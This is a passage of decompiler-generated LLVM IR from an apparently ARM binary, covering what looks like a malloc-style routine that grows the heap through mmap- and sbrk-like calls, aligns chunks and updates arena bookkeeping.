  %v2_151ec = sub i32 0, %v3_151ac
  %v3_151ec = and i32 %v2_151e8, %v2_151ec
  store i32 %v3_151ec, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_151ec, %v0_1516c
  br i1 %tmp211, label %dec_label_pc_151f8, label %dec_label_pc_152a0

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151e4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_151ec, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15210 = call i32 @function_172dc(i32 0, i32 %v3_151ec, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15210, i32* %r0.global-to-local, align 4
  %v7_15214 = icmp eq i32 %v6_15210, -1
  br i1 %v7_15214, label %dec_label_pc_151f8.dec_label_pc_152a0_crit_edge, label %dec_label_pc_1521c

dec_label_pc_151f8.dec_label_pc_152a0_crit_edge:  ; preds = %dec_label_pc_151f8
  %v1_152c4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_152a0

dec_label_pc_1521c:                               ; preds = %dec_label_pc_151f8
  %v1_1521c = urem i32 %v6_15210, 8
  store i32 %v1_1521c, i32* %r2.global-to-local, align 4
  %v2_1521c = icmp eq i32 %v1_1521c, 0
  br i1 %v2_1521c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1521c
  %v2_15220 = sub nsw i32 8, %v1_1521c
  store i32 %v2_15220, i32* %r3.global-to-local, align 4
  %v2_15224 = load i32, i32* @r4, align 4
  %v3_15224 = sub i32 %v2_15224, %v2_15220
  %v3_15228 = add i32 %v2_15220, %v6_15210
  store i32 %v3_15228, i32* %lr.global-to-local, align 4
  %v2_15230 = or i32 %v3_15224, 2
  store i32 %v2_15230, i32* %r2.global-to-local, align 4
  %v5_15238 = inttoptr i32 %v3_15228 to i32*
  store i32 %v2_15220, i32* %v5_15238, align 4
  %v1_1523c = load i32, i32* %r2.global-to-local, align 4
  %v2_1523c = load i32, i32* %lr.global-to-local, align 4
  %v3_1523c = add i32 %v2_1523c, 4
  %v4_1523c = inttoptr i32 %v3_1523c to i32*
  store i32 %v1_1523c, i32* %v4_1523c, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_1521c
  store i32 %v6_15210, i32* %lr.global-to-local, align 4
  %v1_1523447 = load i32, i32* @r4, align 4
  %v2_1523448 = or i32 %v1_1523447, 2
  store i32 %v2_1523448, i32* %r3.global-to-local, align 4
  %v3_15240 = inttoptr i32 %v6_15210 to i32*
  store i32 0, i32* %v3_15240, align 4
  %v1_15244 = load i32, i32* %r3.global-to-local, align 4
  %v2_15244 = load i32, i32* %lr.global-to-local, align 4
  %v3_15244 = add i32 %v2_15244, 4
  %v4_15244 = inttoptr i32 %v3_15244 to i32*
  store i32 %v1_15244, i32* %v4_15244, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 180260, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15250 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15250, i32* %ip.global-to-local, align 4
  %v1_15254 = add i32 %v4_15250, 848
  %v2_15254 = inttoptr i32 %v1_15254 to i32*
  %v3_15254 = load i32, i32* %v2_15254, align 4
  store i32 %v3_15254, i32* %r3.global-to-local, align 4
  %v1_15258 = add i32 %v4_15250, 856
  %v2_15258 = inttoptr i32 %v1_15258 to i32*
  %v3_15258 = load i32, i32* %v2_15258, align 4
  store i32 %v3_15258, i32* %r2.global-to-local, align 4
  %v1_1525c = add i32 %v3_15254, 1
  store i32 %v1_1525c, i32* %r3.global-to-local, align 4
  %v7_15264 = icmp sgt i32 %v1_1525c, %v3_15258
  br i1 %v7_15264, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_1525c, i32* %v2_15258, align 4
  %v0_15268.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_15268.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_15268 = phi i32 [ %v4_15250, %.thread27 ], [ %v1_15268.pre, %bb147 ]
  %v0_15268 = phi i32 [ %v1_1525c, %.thread27 ], [ %v0_15268.pre, %bb147 ]
  %v2_15268 = add i32 %v1_15268, 848
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  store i32 %v0_15268, i32* %v3_15268, align 4
  %v0_1526c = load i32, i32* %ip.global-to-local, align 4
  %v1_1526c = add i32 %v0_1526c, 868
  %v2_1526c = inttoptr i32 %v1_1526c to i32*
  %v3_1526c = load i32, i32* %v2_1526c, align 4
  store i32 %v3_1526c, i32* %r3.global-to-local, align 4
  %v1_15270 = add i32 %v0_1526c, 880
  %v2_15270 = inttoptr i32 %v1_15270 to i32*
  %v3_15270 = load i32, i32* %v2_15270, align 4
  store i32 %v3_15270, i32* %r2.global-to-local, align 4
  %v0_15274 = load i32, i32* @r4, align 4
  %v2_15274 = add i32 %v0_15274, %v3_1526c
  store i32 %v2_15274, i32* %r1.global-to-local, align 4
  %v1_15278 = add i32 %v0_1526c, 872
  %v2_15278 = inttoptr i32 %v1_15278 to i32*
  %v3_15278 = load i32, i32* %v2_15278, align 4
  store i32 %v3_15278, i32* %r3.global-to-local, align 4
  %v1_15280 = add i32 %v0_1526c, 884
  %v2_15280 = inttoptr i32 %v1_15280 to i32*
  %v3_15280 = load i32, i32* %v2_15280, align 4
  store i32 %v3_15280, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_15274, %v3_15270
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_15274, i32* %v2_15270, align 4
  %v0_15288.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15288.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_15288 = phi i32 [ %v0_1526c, %bb148 ], [ %v1_15288.pre, %bb149 ]
  %v0_15288 = phi i32 [ %v2_15274, %bb148 ], [ %v0_15288.pre, %bb149 ]
  %v2_15288 = add i32 %v1_15288, 868
  %v3_15288 = inttoptr i32 %v2_15288 to i32*
  store i32 %v0_15288, i32* %v3_15288, align 4
  %v0_1528c = load i32, i32* %r1.global-to-local, align 4
  %v1_1528c = load i32, i32* %r3.global-to-local, align 4
  %v2_1528c = add i32 %v1_1528c, %v0_1528c
  store i32 %v2_1528c, i32* %r1.global-to-local, align 4
  %v1_15290 = load i32, i32* %r2.global-to-local, align 4
  %v0_15294 = load i32, i32* %lr.global-to-local, align 4
  %v1_15294 = add i32 %v0_15294, 8
  store i32 %v1_15294, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_1528c, %v1_15290
  br i1 %tmp213, label %bb151, label %dec_label_pc_155a0

bb151:                                            ; preds = %bb150
  %v5_15298 = load i32, i32* %ip.global-to-local, align 4
  %v6_15298 = add i32 %v5_15298, 884
  %v7_15298 = inttoptr i32 %v6_15298 to i32*
  store i32 %v2_1528c, i32* %v7_15298, align 4
  br label %dec_label_pc_155a0

dec_label_pc_152a0:                               ; preds = %dec_label_pc_151e4, %dec_label_pc_151c4, %dec_label_pc_151f8.dec_label_pc_152a0_crit_edge, %dec_label_pc_151d4
  %v1_152c4 = phi i32 [ %v1_152c4.pre, %dec_label_pc_151f8.dec_label_pc_152a0_crit_edge ], [ %v0_1516c, %dec_label_pc_151d4 ], [ %v0_1516c, %dec_label_pc_151c4 ], [ %v0_1516c, %dec_label_pc_151e4 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %ip.global-to-local, align 4
  %v4_152a8 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_152a8, i32* %r3.global-to-local, align 4
  %v1_152ac = add i32 %v4_152a8, 44
  %v2_152ac = inttoptr i32 %v1_152ac to i32*
  %v3_152ac = load i32, i32* %v2_152ac, align 4
  store i32 %v3_152ac, i32* %r0.global-to-local, align 4
  %v1_152b0 = add i32 %v4_152a8, 864
  %v2_152b0 = inttoptr i32 %v1_152b0 to i32*
  %v3_152b0 = load i32, i32* %v2_152b0, align 4
  store i32 %v3_152b0, i32* %r2.global-to-local, align 4
  %v1_152b4 = add i32 %v4_152a8, 840
  %v2_152b4 = inttoptr i32 %v1_152b4 to i32*
  %v3_152b4 = load i32, i32* %v2_152b4, align 4
  store i32 %v3_152b4, i32* %r3.global-to-local, align 4
  %v1_152b8 = add i32 %v3_152ac, 4
  %v2_152b8 = inttoptr i32 %v1_152b8 to i32*
  %v3_152b8 = load i32, i32* %v2_152b8, align 4
  store i32 %v3_152b8, i32* %r1.global-to-local, align 4
  %v1_152c0 = urem i32 %v3_152b0, 2
  %v2_152c0 = icmp eq i32 %v1_152c0, 0
  %v1_152bc = add i32 %v1_152c4, 16
  %v2_152c4 = add i32 %v1_152bc, %v3_152b4
  store i32 %v2_152c4, i32* %r3.global-to-local, align 4
  %v1_152c8 = and i32 %v3_152b8, -4
  store i32 %v1_152c8, i32* @r8, align 4
  br i1 %v2_152c0, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_152a0
  %v3_152cc = sub i32 %v2_152c4, %v1_152c8
  store i32 %v3_152cc, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_152a0, %bb152
  %v0_152d0 = phi i32 [ %v2_152c4, %dec_label_pc_152a0 ], [ %v3_152cc, %bb152 ]
  %v1_152d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_152d0 = add i32 %v1_152d0, %v0_152d0
  store i32 %v2_152d0, i32* %r3.global-to-local, align 4
  %v1_152d4 = sub i32 -1, %v1_152d0
  store i32 %v1_152d4, i32* %fp.global-to-local, align 4
  %v2_152d8 = and i32 %v2_152d0, %v1_152d4
  store i32 %v2_152d8, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_152d8, 1
  br i1 %tmp154, label %dec_label_pc_152fc, label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %bb153
  store i32 %v2_152d8, i32* %r0.global-to-local, align 4
  %v1_152ec = call i32 @function_17524(i32 %v2_152d8)
  store i32 %v1_152ec, i32* %r0.global-to-local, align 4
  %v3_152f0 = icmp eq i32 %v1_152ec, -1
  store i32 %v1_152ec, i32* @r4, align 4
  br i1 %v3_152f0, label %dec_label_pc_152fc, label %dec_label_pc_15368

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152e8, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_15304 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15304, i32* %r6.global-to-local, align 4
  %v1_15308 = add i32 %v4_15304, 864
  %v2_15308 = inttoptr i32 %v1_15308 to i32*
  %v3_15308 = load i32, i32* %v2_15308, align 4
  store i32 %v3_15308, i32* %r3.global-to-local, align 4
  %v1_1530c = urem i32 %v3_15308, 2
  %v2_1530c = icmp eq i32 %v1_1530c, 0
  br i1 %v2_1530c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_152fc
  %v1_15310 = load i32, i32* @r8, align 4
  %v2_15310 = load i32, i32* %sb.global-to-local, align 4
  %v3_15310 = add i32 %v2_15310, %v1_15310
  %v2_15314 = load i32, i32* @r5, align 4
  %v3_15314 = add i32 %v3_15310, %v2_15314
  store i32 %v3_15314, i32* %r3.global-to-local, align 4
  %v2_15318 = load i32, i32* %fp.global-to-local, align 4
  %v3_15318 = and i32 %v2_15318, %v3_15314
  store i32 %v3_15318, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_152fc
  %v0_1531c.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_1531c = phi i32 [ %v0_1531c.pr, %.thread29thread-pre-split ], [ %v3_15318, %bb155 ]
  %v2_1531c = icmp ugt i32 %v0_1531c, 1048575
  br i1 %v2_1531c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_15334 = phi i32 [ %v0_1531c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_15324 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_15334, %v1_15324
  br i1 %tmp214, label %dec_label_pc_1532c, label %dec_label_pc_15590

dec_label_pc_1532c:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_15334, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15348 = call i32 @function_172dc(i32 0, i32 %v0_15334, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15348, i32* %r0.global-to-local, align 4
  %v3_1534c = icmp eq i32 %v6_15348, -1
  %v8_1534c = icmp eq i32 %v6_15348, -1
  store i32 %v6_15348, i32* @r4, align 4
  br i1 %v8_1534c, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_1532c
  %v1_15354 = load i32, i32* %r6.global-to-local, align 4
  %v2_15354 = add i32 %v1_15354, 864
  %v3_15354 = inttoptr i32 %v2_15354 to i32*
  %v4_15354 = load i32, i32* %v3_15354, align 4
  %v2_15358 = load i32, i32* @r5, align 4
  %v3_15358 = add i32 %v2_15358, %v6_15348
  store i32 %v3_15358, i32* %r0.global-to-local, align 4
  %v2_1535c = and i32 %v4_15354, -2
  store i32 %v2_1535c, i32* %r3.global-to-local, align 4
  store i32 %v2_1535c, i32* %v3_15354, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_1532c, %bb158
  br i1 %v3_1534c, label %dec_label_pc_15368, label %dec_label_pc_1536c

dec_label_pc_15368:                               ; preds = %.thread32, %dec_label_pc_152e8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1536c

dec_label_pc_1536c:                               ; preds = %.thread32, %dec_label_pc_15368
  %v0_1536c = load i32, i32* @r4, align 4
  %v7_1536c = icmp eq i32 %v0_1536c, -1
  br i1 %v7_1536c, label %dec_label_pc_15590, label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_1536c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r2.global-to-local, align 4
  %v4_1537c = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_1537c, i32* %ip.global-to-local, align 4
  store i32 %v3_152ac, i32* %r2.global-to-local, align 4
  %v1_15384 = add i32 %v4_1537c, 872
  %v2_15384 = inttoptr i32 %v1_15384 to i32*
  %v3_15384 = load i32, i32* %v2_15384, align 4
  %v1_15388 = load i32, i32* @r8, align 4
  %v2_15388 = add i32 %v1_15388, %v3_152ac
  store i32 %v2_15388, i32* %r1.global-to-local, align 4
  %v0_1538c = load i32, i32* @r5, align 4
  %v2_1538c = add i32 %v0_1538c, %v3_15384
  store i32 %v2_1538c, i32* %r3.global-to-local, align 4
  %v9_15390 = icmp eq i32 %v0_1536c, %v2_15388
  br i1 %v9_15390, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_15374
  store i32 %v2_1538c, i32* %v2_15384, align 4
  br label %dec_label_pc_153ac

bb159:                                            ; preds = %dec_label_pc_15374
  %v1_15394 = load i32, i32* %r0.global-to-local, align 4
  %v8_15394 = icmp eq i32 %v1_15394, -1
  store i32 %v2_1538c, i32* %v2_15384, align 4
  br i1 %v8_15394, label %.thread34, label %dec_label_pc_153ac

.thread34:                                        ; preds = %bb159
  %v1_1539c = load i32, i32* @r5, align 4
  %v2_1539c = load i32, i32* @r8, align 4
  %v3_1539c = add i32 %v2_1539c, %v1_1539c
  %v2_153a0 = or i32 %v3_1539c, 1
  store i32 %v2_153a0, i32* %r3.global-to-local, align 4
  %v2_153a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_153a4 = add i32 %v2_153a4, 4
  %v4_153a4 = inttoptr i32 %v3_153a4 to i32*
  store i32 %v2_153a0, i32* %v4_153a4, align 4
  br label %dec_label_pc_15524

dec_label_pc_153ac:                               ; preds = %bb159, %.thread122
  %v0_153b0.pr = load i32, i32* @r8, align 4
  %v0_153ac = load i32, i32* %ip.global-to-local, align 4
  %v1_153ac = add i32 %v0_153ac, 864
  %v2_153ac = inttoptr i32 %v1_153ac to i32*
  %v3_153ac = load i32, i32* %v2_153ac, align 4
  store i32 %v3_153ac, i32* %r2.global-to-local, align 4
  %v2_153b0 = icmp eq i32 %v0_153b0.pr, 0
  br i1 %v2_153b0, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_153ac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_153ac
  %v2_153b8 = urem i32 %v3_153ac, 2
  store i32 %v2_153b8, i32* %r3.global-to-local, align 4
  %v2_153bc = icmp eq i32 %v2_153b8, 0
  br i1 %v2_153bc, label %.thread40, label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %.thread36
  %v0_153c4 = load i32, i32* @r4, align 4
  %v1_153c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_153c4 = icmp ult i32 %v0_153c4, %v1_153c4
  br i1 %v3_153c4, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_153c4
  %v2_153c8 = and i32 %v3_153ac, -2
  store i32 %v2_153c8, i32* %r3.global-to-local, align 4
  store i32 %v2_153c8, i32* %v2_153ac, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_153c4, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %ip.global-to-local, align 4
  %v4_153d8 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_153d8, i32* @r7, align 4
  %v1_153dc = add i32 %v4_153d8, 864
  %v2_153dc = inttoptr i32 %v1_153dc to i32*
  %v3_153dc = load i32, i32* %v2_153dc, align 4
  store i32 %v3_153dc, i32* %r3.global-to-local, align 4
  %v1_153e0 = urem i32 %v3_153dc, 2
  store i32 %v1_153e0, i32* @r6, align 4
  %v2_153e0 = icmp eq i32 %v1_153e0, 0
  br i1 %v2_153e0, label %dec_label_pc_15474, label %dec_label_pc_153e8

dec_label_pc_153e8:                               ; preds = %.thread40
  %v0_153e8 = load i32, i32* @r8, align 4
  %v2_153e8 = icmp eq i32 %v0_153e8, 0
  br i1 %v2_153e8, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_153e8
  %v2_153ec = add i32 %v4_153d8, 872
  %v3_153ec = inttoptr i32 %v2_153ec to i32*
  %v4_153ec = load i32, i32* %v3_153ec, align 4
  store i32 %v4_153ec, i32* %r2.global-to-local, align 4
  %v1_153f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_153f0 = load i32, i32* @r4, align 4
  %v3_153f0 = sub i32 %v2_153f0, %v1_153f0
  %v3_153f4 = add i32 %v3_153f0, %v4_153ec
  store i32 %v3_153f4, i32* %r3.global-to-local, align 4
  store i32 %v3_153f4, i32* %v3_153ec, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_153e8, %bb161
  %v0_153fc = load i32, i32* @r4, align 4
  %v1_153fc = urem i32 %v0_153fc, 8
  store i32 %v1_153fc, i32* %r3.global-to-local, align 4
  %v2_153fc = icmp eq i32 %v1_153fc, 0
  br i1 %v2_153fc, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_15400 = sub nsw i32 8, %v1_153fc
  store i32 %v2_15400, i32* %r3.global-to-local, align 4
  %v3_15404 = add i32 %v2_15400, %v0_153fc
  store i32 %v3_15404, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_1540c = phi i32 [ 0, %.thread43 ], [ %v2_15400, %bb162 ]
  %v1_15408 = load i32, i32* @r5, align 4
  %v2_15408 = add i32 %v1_15408, %v0_153fc
  store i32 %v2_15408, i32* @r6, align 4
  %v1_1540c = load i32, i32* @r8, align 4
  %v2_1540c = add i32 %v2_15408, %v0_1540c
  %v2_15410 = add i32 %v2_1540c, %v1_1540c
  store i32 %v2_15410, i32* %r1.global-to-local, align 4
  %v1_15414 = load i32, i32* %sb.global-to-local, align 4
  %v2_15414 = add i32 %v1_15414, %v2_15410
  %v1_15418 = load i32, i32* %fp.global-to-local, align 4
  %v2_15418 = and i32 %v1_15418, %v2_15414
  store i32 %v2_15418, i32* %r2.global-to-local, align 4
  %v2_1541c = sub i32 0, %v2_15408
  store i32 %v2_1541c, i32* %r3.global-to-local, align 4
  %v2_15420 = sub i32 %v2_15418, %v2_15408
  store i32 %v2_15420, i32* @r5, align 4
  store i32 %v2_15420, i32* %r0.global-to-local, align 4
  br i1 %v2_153fc, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_153fc, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_1542c = call i32 @function_17524(i32 %v2_15420)
  store i32 %v1_1542c, i32* %r0.global-to-local, align 4
  %v3_15430 = icmp eq i32 %v1_1542c, -1
  br i1 %v3_15430, label %dec_label_pc_15438, label %dec_label_pc_15448

dec_label_pc_15438:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1543c = call i32 @function_17524(i32 0)
  store i32 %v1_1543c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_154a0

dec_label_pc_15448:                               ; preds = %bb164
  %v1_15448 = load i32, i32* @r4, align 4
  %v3_15448 = icmp ult i32 %v1_1542c, %v1_15448
  br i1 %v3_15448, label %dec_label_pc_15450, label %dec_label_pc_154a0

dec_label_pc_15450:                               ; preds = %dec_label_pc_15448
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r0.global-to-local, align 4
  %v4_15458 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15458, i32* %r2.global-to-local, align 4
  %v1_1545c = add i32 %v4_15458, 864
  %v2_1545c = inttoptr i32 %v1_1545c to i32*
  %v3_1545c = load i32, i32* %v2_1545c, align 4
  %v0_15460 = load i32, i32* @r6, align 4
  store i32 %v0_15460, i32* %r0.global-to-local, align 4
  %v1_15464 = and i32 %v3_1545c, -2
  store i32 %v1_15464, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_15464, i32* %v2_1545c, align 4
  br label %dec_label_pc_154a0

dec_label_pc_15474:                               ; preds = %.thread40
  %v0_15474 = load i32, i32* %r0.global-to-local, align 4
  %v3_15474 = icmp eq i32 %v0_15474, -1
  br i1 %v3_15474, label %dec_label_pc_1547c, label %dec_label_pc_15498

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15474
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15480 = call i32 @function_17524(i32 0)
  store i32 %v1_15480, i32* %r0.global-to-local, align 4
  %v0_15484 = load i32, i32* @r7, align 4
  %v1_15484 = add i32 %v0_15484, 872
  %v2_15484 = inttoptr i32 %v1_15484 to i32*
  %v3_15484 = load i32, i32* %v2_15484, align 4
  store i32 %v3_15484, i32* %r2.global-to-local, align 4
  %v0_15488 = load i32, i32* @r4, align 4
  %v0_1548c = load i32, i32* @r5, align 4
  %v2_15488 = add i32 %v3_15484, %v1_15480
  %v2_1548c = sub i32 %v2_15488, %v0_15488
  %v2_15490 = sub i32 %v2_1548c, %v0_1548c
  store i32 %v2_15490, i32* %r3.global-to-local, align 4
  store i32 %v2_15490, i32* %v2_15484, align 4
  %v0_1549c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15474, %dec_label_pc_1547c
  %v0_1549c = phi i32 [ 0, %dec_label_pc_15474 ], [ %v0_1549c.pre, %dec_label_pc_1547c ]
  %v0_15498 = load i32, i32* @r4, align 4
  store i32 %v0_15498, i32* @r7, align 4
  store i32 %v0_1549c, i32* @r5, align 4
  br label %dec_label_pc_154a0

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15450, %dec_label_pc_15438, %dec_label_pc_15498
  %v0_154a0 = load i32, i32* %r0.global-to-local, align 4
  %v7_154a0 = icmp eq i32 %v0_154a0, -1
  br i1 %v7_154a0, label %dec_label_pc_15524, label %dec_label_pc_154a8

dec_label_pc_154a8:                               ; preds = %dec_label_pc_154a0
  %v1_154a8 = load i32, i32* @r5, align 4
  %v2_154a8 = add i32 %v1_154a8, %v0_154a0
  %v0_154ac = load i32, i32* @r7, align 4
  %v2_154ac = sub i32 %v2_154a8, %v0_154ac
  %v1_154b0 = or i32 %v2_154ac, 1
  %v2_154b4 = add i32 %v0_154ac, 4
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  store i32 %v1_154b0, i32* %v3_154b4, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_154c0 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_154c0, i32* @r6, align 4
  %v1_154c4 = add i32 %v4_154c0, 872
  %v2_154c4 = inttoptr i32 %v1_154c4 to i32*
  %v3_154c4 = load i32, i32* %v2_154c4, align 4
  %v0_154c8 = load i32, i32* @r8, align 4
  %v2_154c8 = icmp eq i32 %v0_154c8, 0
  %v0_154cc = load i32, i32* @r5, align 4
  %v2_154cc = add i32 %v0_154cc, %v3_154c4
  store i32 %v2_154cc, i32* %r3.global-to-local, align 4
  store i32 %v2_154cc, i32* %v2_154c4, align 4
  %v0_154d4 = load i32, i32* @r7, align 4
  %v1_154d4 = load i32, i32* @r6, align 4
  %v2_154d4 = add i32 %v1_154d4, 44
  %v3_154d4 = inttoptr i32 %v2_154d4 to i32*
  store i32 %v0_154d4, i32* %v3_154d4, align 4
  br i1 %v2_154c8, label %dec_label_pc_15524, label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154a8
  %v0_154e0 = load i32, i32* @r8, align 4
  %v1_154e0 = add i32 %v0_154e0, -12
  %v1_154e4 = and i32 %v1_154e0, -8
  store i32 %v3_152ac, i32* %ip.global-to-local, align 4
  %v2_154ec = add i32 %v1_154e4, %v3_152ac
  store i32 %v2_154ec, i32* %r1.global-to-local, align 4
  %v2_154f0 = icmp ugt i32 %v1_154e4, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_154f8 = or i32 %v1_154e4, 1
  store i32 %v1_154f8, i32* %r3.global-to-local, align 4
  store i32 %v1_154f8, i32* %v2_152b8, align 4
  %v0_15500 = load i32, i32* %r2.global-to-local, align 4
  %v1_15500 = load i32, i32* %r1.global-to-local, align 4
  %v2_15500 = add i32 %v1_15500, 8
  %v3_15500 = inttoptr i32 %v2_15500 to i32*
  store i32 %v0_15500, i32* %v3_15500, align 4
  %v0_15504 = load i32, i32* %r2.global-to-local, align 4
  %v1_15504 = load i32, i32* %r1.global-to-local, align 4
  %v2_15504 = add i32 %v1_15504, 4
  %v3_15504 = inttoptr i32 %v2_15504 to i32*
  store i32 %v0_15504, i32* %v3_15504, align 4
  br i1 %v2_154f0, label %dec_label_pc_1550c, label %dec_label_pc_15524

dec_label_pc_1550c:                               ; preds = %dec_label_pc_154dc
  %v0_1550c = load i32, i32* @r6, align 4
  %v1_1550c = add i32 %v0_1550c, 836
  %v2_1550c = inttoptr i32 %v1_1550c to i32*
  %v3_1550c = load i32, i32* %v2_1550c, align 4
  store i32 %v3_1550c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_15514 = load i32, i32* %ip.global-to-local, align 4
  %v1_15514 = add i32 %v0_15514, 8
  store i32 %v1_15514, i32* @r0, align 4
  store i32 -1, i32* %v2_1550c, align 4
  %v0_1551c = call i32 @function_15850()
  store i32 %v0_1551c, i32* %r0.global-to-local, align 4
  %v0_15520 = load i32, i32* @r4, align 4
  %v1_15520 = load i32, i32* @r6, align 4
  %v2_15520 = add i32 %v1_15520, 836
  %v3_15520 = inttoptr i32 %v2_15520 to i32*
  store i32 %v0_15520, i32* %v3_15520, align 4
  br label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %.thread34, %dec_label_pc_154dc, %dec_label_pc_154a8, %dec_label_pc_154a0, %dec_label_pc_1550c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r0.global-to-local, align 4
  %v4_1552c = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_1552c, i32* %lr.global-to-local, align 4
  %v1_15530 = add i32 %v4_1552c, 872
  store i32 %v1_15530, i32* %r1.global-to-local, align 4
  %v1_15534 = inttoptr i32 %v1_15530 to i32*
  %v2_15534 = load i32, i32* %v1_15534, align 4
  store i32 %v2_15534, i32* %r1.global-to-local, align 4
  %v3_15534 = add i32 %v4_1552c, 876
  %v4_15534 = inttoptr i32 %v3_15534 to i32*
  %v5_15534 = load i32, i32* %v4_15534, align 4
  store i32 %v5_15534, i32* %r3.global-to-local, align 4
  %v1_1553c = add i32 %v4_1552c, 868
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* %r3.global-to-local, align 4
  %v1_15540 = add i32 %v4_1552c, 884
  %v2_15540 = inttoptr i32 %v1_15540 to i32*
  %v3_15540 = load i32, i32* %v2_15540, align 4
  store i32 %v3_15540, i32* %r2.global-to-local, align 4
  %v2_15544 = add i32 %v3_1553c, %v2_15534
  store i32 %v2_15544, i32* %r3.global-to-local, align 4
